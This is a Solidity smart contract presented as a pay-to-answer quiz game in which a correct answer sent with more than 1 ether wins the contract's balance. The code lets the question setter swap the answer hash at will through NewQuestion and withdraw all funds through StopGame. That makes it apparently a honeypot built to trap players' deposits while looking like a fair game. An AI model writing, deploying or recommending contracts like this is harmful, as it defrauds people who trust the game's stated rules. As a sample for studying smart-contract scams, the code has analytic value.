1 pragma solidity ^0.4.20;
2 
3 contract QUICK_QUIZ_GAME
4 {
5     function Play(string _response)
6     external
7     payable
8     {
9         require(msg.sender == tx.origin);
10         if(responseHash == keccak256(_response) && msg.value>1 ether)
11         {
12             msg.sender.transfer(this.balance);
13         }
14     }
15     
16     string public question;
17  
18     address questionSender;
19   
20     bytes32 responseHash;
21  
22     function StartGame(string _question,string _response)
23     public
24     payable
25     {
26         if(responseHash==0x0)
27         {
28             responseHash = keccak256(_response);
29             question = _question;
30             questionSender = msg.sender;
31         }
32     }
33     
34     function StopGame()
35     public
36     payable
37     {
38        require(msg.sender==questionSender);
39        msg.sender.transfer(this.balance);
40     }
41     
42     function NewQuestion(string _question, bytes32 _responseHash)
43     public
44     payable
45     {
46         require(msg.sender==questionSender);
47         question = _question;
48         responseHash = _responseHash;
49     }
50     
51     function() public payable{}
52 }